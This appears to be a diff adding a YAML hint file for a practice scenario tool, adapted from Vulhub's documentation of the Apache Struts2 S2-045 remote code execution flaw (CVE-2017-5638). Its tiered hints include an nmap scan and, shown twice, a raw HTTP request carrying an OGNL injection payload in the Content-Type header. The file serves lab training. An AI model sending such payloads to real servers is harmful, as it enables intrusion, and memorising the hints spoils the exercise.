@@ -1,0 +1,93 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-045
+cve: CVE-2017-5638
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
+  high:
+  - |-
+    Vulnerability: S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）.
+
+    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2017-5638
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploitation
+
+    Verify the vulnerability by following request:
+
+    ```
+    POST / HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.8,es;q=0.6
+    Connection: close
+    Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+
+
+    ```
+
+    `233*233` has been successfully executed:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/README.md'
+  - |-
+    Additional public references:
+    - http://struts.apache.org/docs/s2-045.html
+    - https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/
+access_instructions:
+  title: S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`.
+  - title: Exploitation
+    instructions: |-
+      Verify the vulnerability by following request:
+
+      ```
+      POST / HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Upgrade-Insecure-Requests: 1
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      Accept-Language: en-US,en;q=0.8,es;q=0.6
+      Connection: close
+      Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+
+
+      ```
+
+      `233*233` has been successfully executed:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/README.md
+  readme_sha256: 6dc8248cdd0b09215b3e4f80dfe0f949e7b7234638738fce5923cae69e2c9e70
+  compose_sha256: 3b7c0fe02382a3e2d2925e865baf41b0e17363ce0978d671489e10f6c3f7ac00
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
